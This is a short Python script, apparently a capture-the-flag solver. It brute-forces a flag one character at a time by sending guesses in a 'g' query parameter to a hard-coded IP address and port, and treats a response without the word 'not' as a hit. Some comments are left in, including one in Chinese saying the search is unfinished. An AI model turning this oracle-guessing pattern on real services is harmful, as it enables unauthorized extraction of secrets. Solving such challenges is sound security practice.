import requests


# url_text='http://43.138.50.201:54000/?g=CTF{'
url='http://43.138.50.201:54000'
ALLchart=['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z','}']
flag='CTF{904bee'
# for i in range(0,26):
#     ALLchart.append(chr(65+i))

# url = "http://test/api/auth/me"
#
# params = {"token":"xxxx"}
#
# res = requests.get(url=url,params=params)
#
# print(res.text)

# print(ALLchart)
# 没找完
f=0
while True:
    for i in range(0, len(ALLchart)):
        # print(url_text+ALLchart[i])
        # params={"g":'{90'+ALLchart[i]}
        params = {"g": flag[-3:] + ALLchart[i]}
        print(params)
        response = requests.get(url=url, params=params)
        keyword = response.text

        print(keyword)
        if keyword.find('not') == -1:
            flag = flag + ALLchart[i]
            if keyword[-1]=='}':
                f=1
            print(flag)
            break
    if f==1:
        print(flag)
        break;
    print('=============================')

